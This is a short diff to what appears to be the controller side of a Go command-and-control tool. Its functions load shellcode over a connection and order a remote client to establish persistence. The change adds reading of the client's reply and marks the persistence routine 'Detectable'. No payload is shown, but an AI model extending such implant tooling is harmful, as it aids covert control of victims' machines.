@@ -301,8 +301,9 @@ func load(conn *net.Conn, fileWShellcode string) {
 	fmt.Println()
 }
 
+// Detectable
 func persist(conn *net.Conn, fileName string) {
-	fmt.Println(fileName)
+	//fmt.Println(fileName)
 	(*conn).Write([]byte("persist\n"))
 	buffer := make([]byte, 100)
 	read_len, err := (*conn).Read(buffer)
@@ -320,6 +321,19 @@ func persist(conn *net.Conn, fileName string) {
 		fmt.Println("[-]Something went wrong creating persistance")
 		return
 	}
+	//Read the response from the client
+	read_len, err = (*conn).Read(buffer)
+	if err != nil {
+		fmt.Println("[-]Error Reading From Buffer")
+		return
+	}
+	if read_len <= 1 {
+		fmt.Println("[-]Error with length of Buffer")
+		return
+	}
+	bufferSnapped = buffer[:read_len]
+	bufferStr = string(bufferSnapped)
+	fmt.Println("[!]" + bufferStr)
 }
 
 // Continue this later
